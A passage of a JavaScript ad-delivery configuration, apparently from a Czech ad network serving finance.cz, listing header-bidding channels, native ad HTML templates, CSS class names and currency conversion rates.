          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 300], [300, 250], [200, 600], [160, 600], [120, 600], [250, 250], [240, 400], [220, 250]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 166647,
          "tag": "pubmatic-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "798915-3709897"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 300], [250, 250], [160, 600], [120, 600]]
        },
        "floor": 0,
        "factor": 18.870927403769635,
        "factorFixed": 20.00773025941841,
        "styles": []
      }, {
        "chd": {
          "id": 166655,
          "tag": "xandr",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "21714027"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[234, 600], [300, 390], [160, 600], [300, 300], [300, 250], [120, 600]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 166667,
          "tag": "stroeer-banner",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "06b7e0f9-e53e-46ff-ba53-8a696dee0164"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[160, 600], [300, 300], [300, 250], [120, 600], [250, 250]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 166671,
          "tag": "xandr-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "21713312"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 1,
          "height": 1
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": {
          "normal": {
            "name": "n-j-1-halfpage-single_default-56681",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          },
          "product": {
            "name": "p-j-1-halfpage-single_default-56681",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 166679,
          "tag": "criteo-hb-xhr-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1387199-hb_300x600_2_(ii.finance.cz)\/Native_6_Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": {
          "normal": {
            "name": "n-j-1-halfpage-single_default-56681",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          },
          "product": {
            "name": "p-j-1-halfpage-single_default-56681",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 166683,
          "tag": "smart-hb-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "394820-1350874-102178"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 13,
          "height": 31
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "bfc": 1.1111111111111112,
        "factorFixed": 24.53024579306285,
        "styles": {
          "normal": {
            "name": "n-j-1-halfpage-single_default-56681",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          },
          "product": {
            "name": "p-j-1-halfpage-single_default-56681",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 300px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.5em;padding: 1em 0;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1.5em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 140,
                "maxTitleLength": 40,
                "maxDescLength": 200
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 548027,
          "tag": "seznam-ssp-hb2",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "2": "296570"
          },
          "unmaskedDomain": false,
          "currency": "CZK",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 300], [300, 250], [160, 600]]
        },
        "floor": 0,
        "factor": 1,
        "factorFixed": 1,
        "styles": {
          "normal": {
            "name": "n-j-2-halfpage-double_default-56683",
            "count": 2,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 15px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 50%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <div class='AdTrack-ad-1' style='box-sizing: border-box;width: 100%;height: 50%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 120px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.3em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 70,
                "maxTitleLength": 40,
                "maxDescLength": 90
              }
            }
          },
          "product": {
            "name": "p-j-2-halfpage-double_default-56683",
            "count": 2,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 300px;height: 600px;font-size: 15px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;'><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 50%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <div class='AdTrack-ad-1' style='box-sizing: border-box;width: 100%;height: 50%;padding: 5% 5%;margin: 0 auto;text-align: center;display: table;box-shadow: 0 6px 4px -7px;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 80%;max-height: 120px;width: auto;height: auto;'> <div style=' '> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding-bottom: 0.3em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a>",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 70,
                "maxTitleLength": 40,
                "maxDescLength": 90
              }
            }
          }
        }
      }, {
        "chd": {
          "id": 780469,
          "tag": "rtbhouse-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_300x600_2_(ii.finance.cz)_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 250], [300, 300], [160, 600], [250, 250], [120, 600], [240, 400], [300, 337], [250, 360], [300, 480], [300, 319], [300, 465], [300, 359], [300, 470], [300, 368], [300, 360], [300, 476], [300, 332]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 787425,
          "tag": "adaptmx-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_300x600_2_(ii.finance.cz)_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 250], [300, 300], [160, 600], [250, 250], [120, 600], [240, 400], [300, 337], [250, 360], [300, 480], [300, 319], [300, 465], [300, 359], [300, 470], [300, 368], [300, 360], [300, 476], [300, 332]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 788581,
          "tag": "onetag",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "hb_300x600_2_ii_finance_cz_-_Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 300,
          "height": 600,
          "sizes": [[300, 250], [300, 300], [160, 600], [250, 250], [120, 600], [240, 400], [300, 337], [250, 360], [300, 480], [300, 319], [300, 465], [300, 359], [300, 470], [300, 368], [300, 360], [300, 476], [300, 332]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }],
      "s2s": false
    }]
  },
  "cls": {
    "headline": "AdTrack-headline",
    "description": "AdTrack-description",
    "adChoices": "AdTrack-adChoices",
    "date": "AdTrack-date",
    "ad": "AdTrack-ad-*",
    "ads": "AdTrack-ads",
    "container": "AdTrack-container",
    "promoTitle": "AdTrack-promoTitle",
    "promoIcon": "AdTrack-promoIcon",
    "promoClick": "AdTrack-promoClick",
    "closeTitle": "AdTrack-closeTitle",
    "closeClick": "AdTrack-closeClick",
    "creative1": "AdTrack-creative1",
    "creative2": "AdTrack-creative2",
    "creative3": "AdTrack-creative3",
    "creative23": "AdTrack-creative23",
    "creative123": "AdTrack-creative123",
    "bannerUrl": "AdTrack-bannerUrl",
    "bannerRel": "AdTrack-bannerRel",
    "adUrl": "AdTrack-adUrl",
    "clickUrl": "AdTrack-clickUrl-*",
    "visibleUrl": "AdTrack-visibleUrl",
    "longHeadline": "AdTrack-longHeadline",
    "companyName": "AdTrack-companyName",
    "logoUrl": "AdTrack-logoUrl",
    "squareLogoUrl": "AdTrack-squareLogoUrl",
    "screenshot": "AdTrack-screenshot",
    "screenshothq": "AdTrack-screenshothq",
    "favicon": "AdTrack-favicon",
    "cta": "AdTrack-cta",
    "imageUrl": "AdTrack-imageUrl",
    "category": "AdTrack-category",
    "logoutUrl": "AdTrack-logoutUrl",
    "title": "AdTrack-title",
    "manufacturer": "AdTrack-manufacturer",
    "price": "AdTrack-price",
    "lastPrice": "AdTrack-lastPrice",
    "discount": "AdTrack-discount",
    "condition": "AdTrack-condition",
    "additionalInfo": "AdTrack-additionalInfo",
    "productDescription": "AdTrack-productDescription",
    "shopName": "AdTrack-shopName",
    "shopSlogan": "AdTrack-shopSlogan",
    "shopUrl": "AdTrack-shopUrl",
    "shopLogoUrl": "AdTrack-shopLogoUrl",
    "cleanShopUrl": "AdTrack-cleanShopUrl",
    "confirmImpUrl": "AdTrack-confirmImpUrl",
    "productTextTemplate": "AdTrack-productTextTemplate"
  },
  "test": false
}, null, "delivery.r2b2.cz", null, {
  "timeout": 10000,
  "visitor": {
    "countryISO": "JP",
    "gdpr": 0
  },
  "publisher": {
    "id": "32",
    "tag": "ii"
  },
  "ip": "50.7.159.142"
});
AdTrack.units["classic_ii.finance.cz_hb_480x300"] = new AdTrack.Dispatcher("classic", "ii.finance.cz", "hb", "480x300", {
  "renderer": "flexi",
  "options": {
    "dom": {
      "method": "container",
      "selectorForeign": "1"
    },
    "hb": {
      "currency": "USD",
      "onlyPrebid": true,
      "prebidAdUnitsPath": "pbjs.adUnits",
      "targeting": []
    },
    "noFPBNs": {
      "1": "36864793",
      "3": "35378918",
      "5": "38308494",
      "7": "37087795",
      "9": "37388055",
      "13": "37471860",
      "15": "37543676",
      "19": "37827190",
      "21": "37841587",
      "23": "37848515",
      "25": "37974109",
      "27": "37974663",
      "31": "38062118",
      "33": "38105499",
      "35": "38155389",
      "41": "38205101",
      "43": "38206998",
      "45": "38207000",
      "47": "38294481",
      "49": "38397175",
      "51": "38499466",
      "53": "38499409",
      "55": "38564125",
      "57": "38564378",
      "59": "38564379",
      "63": "38564531",
      "65": "38564652",
      "67": "38578260",
      "73": "38607930",
      "75": "38814525",
      "83": "38943634",
      "85": "39048920",
      "87": "39152378",
      "89": "39464480",
      "93": "39671195",
      "95": "39671197",
      "97": "39863294",
      "99": "40165496",
      "101": "40177548",
      "103": "40304968",
      "107": "40548792",
      "109": "40769002",
      "111": "40769003",
      "113": "40769102",
      "115": "40954941",
      "117": "40954952",
      "119": "40964226",
      "121": "40964227",
      "123": "41110847",
      "125": "508238",
      "129": "41289790",
      "131": "41289791",
      "135": "41293384",
      "145": "41110891",
      "147": "41390292",
      "149": "41526930",
      "153": "41579327",
      "155": "41640870",
      "157": "41649243",
      "159": "41649244",
      "161": "41903685",
      "163": "42688264",
      "165": "42749800",
      "167": "42749857",
      "169": "42936660",
      "171": "42758494",
      "173": "42989624",
      "175": "43026410",
      "177": "43121537",
      "179": "43748272",
      "181": "43748273",
      "183": "43748274",
      "185": "43748275",
      "187": "43816960",
      "191": "44023945",
      "193": "35330297",
      "195": "35330298",
      "197": "44031450",
      "199": "44056173",
      "201": "44838490",
      "203": "44973412",
      "205": "38235276",
      "207": "43687619",
      "209": "38235288",
      "211": "35191520",
      "213": "35192610",
      "215": "43718505",
      "217": "45488261",
      "219": "561561",
      "221": "45720614",
      "223": "45721149",
      "225": "45721155",
      "227": "45721156",
      "229": "45721158",
      "231": "45721159",
      "233": "45721541",
      "245": "35330227",
      "247": "35329454",
      "249": "35329455",
      "251": "35329456",
      "253": "35329457",
      "255": "35329458",
      "257": "35329459",
      "259": "35329460",
      "261": "35329461",
      "263": "35329462",
      "265": "36709751",
      "267": "37160164",
      "269": "43688507",
      "271": "45751953",
      "273": "45751954",
      "277": "38235286",
      "279": "38235287",
      "283": "38235289",
      "285": "38235290",
      "287": "38235291",
      "289": "38235292",
      "291": "38235293",
      "293": "38235294",
      "327": "35330120",
      "331": "46210805",
      "341": "46781560"
    },
    "publisher": {
      "id": "32",
      "tag": "ii"
    }
  },
  "info": {
    "realDomain": "finance.cz",
    "language": "Czech",
    "ctaDefault": "Nav\u0161t\u00edvit str\u00e1nku",
    "region": "Europe"
  },
  "currencies": {
    "EUR": 24.53024579306285,
    "USD": 22.736057112975466,
    "CZK": 1,
    "AUD": 14.915355358341413,
    "BGN": 12.534941148451308,
    "BRL": 4.5859989452202425,
    "CAD": 16.70815859384137,
    "CHF": 25.951108112316398,
    "CNY": 3.1680759324439487,
    "DKK": 3.289581894141255,
    "GBP": 28.53229856197215,
    "HKD": 2.91088613195629,
    "HUF": 0.06415883469078457,
    "IDR": 0.0014595585509407543,
    "ILS": 6.121636925713936,
    "INR": 0.27263393278264914,
    "ISK": 0.16232978301864892,
    "JPY": 0.15612687931876224,
    "KRW": 0.017293138269500557,
    "MXN": 1.3133873573332984,
    "MYR": 4.8555238867497605,
    "NOK": 2.0704105209981036,
    "NZD": 13.933786645858879,
    "PHP": 0.40914839444032797,
    "PLN": 5.6634120925174996,
    "RON": 4.93208518697535,
    "SEK": 2.1732563421053204,
    "SGD": 16.937669376693766,
    "THB": 0.6357885367326827,
    "TRY": 0.7826716496761696,
    "ZAR": 1.1946189583639455
  },
  "excludes": [],
  "waterfall": {
    "id": 20085,
    "tiers": [{
      "method": "hb",
      "id": 42773,
      "channels": [{
        "chd": {
          "id": 165939,
          "tag": "adform",
          "flag": "Premium",
          "title": "Reklama",
          "keys": {
            "1": "990760"
          },
          "unmaskedDomain": true,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 480,
          "height": 300,
          "sizes": [[336, 280], [300, 300], [300, 250], [250, 250], [200, 200]]
        },
        "floor": 24.58,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 165955,
          "tag": "adform",
          "flag": "PublisherStandard",
          "title": "Reklama",
          "keys": {
            "1": "1056860"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 480,
          "height": 300,
          "sizes": [[336, 280], [300, 300], [300, 250], [250, 250], [200, 200]]
        },
        "floor": 10,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166011,
          "tag": "adform",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1056861"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross_gross",
          "s2s": false,
          "width": 480,
          "height": 300,
          "sizes": [[336, 280], [300, 300], [300, 250], [250, 250], [200, 200]]
        },
        "floor": 0,
        "factor": 22.077221213756566,
        "factorFixed": 23.303733503409706,
        "styles": []
      }, {
        "chd": {
          "id": 166017,
          "tag": "criteo-hb-xhr",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "multiple_hb_480x300_(ii.finance.cz)\/Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 480,
          "height": 300,
          "sizes": [[336, 280], [320, 240], [300, 250], [300, 210], [320, 150]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 165967,
          "tag": "smart-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "394820-1350874-80164"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 480,
          "height": 300,
          "sizes": [[336, 280], [300, 300], [320, 250], [336, 228], [300, 250], [250, 250], [320, 150], [300, 150], [200, 200], [300, 168]]
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "bfc": 1.1111111111111112,
        "factorFixed": 24.53024579306285,
        "styles": []
      }, {
        "chd": {
          "id": 166027,
          "tag": "pubmatic-hb",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "798915-3709863"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 480,
          "height": 300,
          "sizes": [[300, 250], [320, 100], [336, 280], [320, 50]]
        },
        "floor": 0,
        "factor": 18.870927403769635,
        "factorFixed": 20.00773025941841,
        "styles": []
      }, {
        "chd": {
          "id": 166045,
          "tag": "xandr",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "21713947"
          },
          "unmaskedDomain": false,
          "currency": "USD",
          "priceType": "gross",
          "s2s": false,
          "width": 480,
          "height": 300,
          "sizes": [[336, 280], [300, 300], [300, 250], [480, 80], [320, 120], [300, 120], [300, 100]]
        },
        "floor": 0,
        "factor": 22.736057112975466,
        "factorFixed": 22.736057112975466,
        "styles": []
      }, {
        "chd": {
          "id": 166111,
          "tag": "criteo-hb-xhr-native",
          "flag": "Zero",
          "title": "Reklama",
          "keys": {
            "1": "1387199-hb_480x300_(ii.finance.cz)\/Native_6_Zero"
          },
          "unmaskedDomain": false,
          "currency": "EUR",
          "priceType": "gross",
          "s2s": false,
          "width": 480,
          "height": 300
        },
        "floor": 0,
        "factor": 24.53024579306285,
        "factorFixed": 24.53024579306285,
        "styles": {
          "normal": {
            "name": "n-j-1-widesquare_default-56737",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 480px;height: 300px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;' ><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 7%;margin: 0 auto;text-align: center;display: table;'><\/div> <\/div>",
              "ad": "<a href='' class='AdTrack-clickUrl-image' style='display: table-cell; vertical-align: middle; '> <div style=' '> <img src='' alt='' class='AdTrack-imageUrl' style='max-width: 90%;max-height: 120px;width: auto;height: auto;' \/> <\/div> <div style='padding: 0 30px;'> <span class='AdTrack-headline' style='display: block;font-size: 1.2em;line-height: 1.2em;padding: 0.3em 0 0.5em;'><\/span> <span class='AdTrack-description' style='display: inline-block;text-decoration: none;color: black;font-size: 1em;line-height: 1em;'><\/span> <\/div> <\/a> ",
              "css": "",
              "faviconFallback": "",
              "nativeOptions": {
                "titleLength": 30,
                "descLength": 70,
                "maxTitleLength": 40,
                "maxDescLength": 90
              }
            }
          },
          "product": {
            "name": "p-j-1-widesquare_default-56737",
            "count": 1,
            "options": {
              "dom": {
                "method": "container",
                "selectorForeign": "1"
              },
              "hb": {
                "currency": "USD",
                "onlyPrebid": true,
                "prebidAdUnitsPath": "pbjs.adUnits",
                "targeting": []
              },
              "wrap": "<div style='position: relative;width: 480px;height: 300px;font-size: 17px;box-shadow: 0px 0px 8px -3px;'> <a href='' class='AdTrack-promoClick AdTrack-adChoices' style='position: absolute;top: 1px;right: 2px;z-index: 1;font-size: 10px;color: #ccc;font-weight: normal;line-height: 10px;margin-left: 5px;display: inline-block;text-decoration: none;' ><\/a> <div class='AdTrack-ad-0' style='box-sizing: border-box;width: 100%;height: 100%;padding: 5% 7%;margin: 0 auto;text-align: center;display: table;'><\/div> <\/div>",
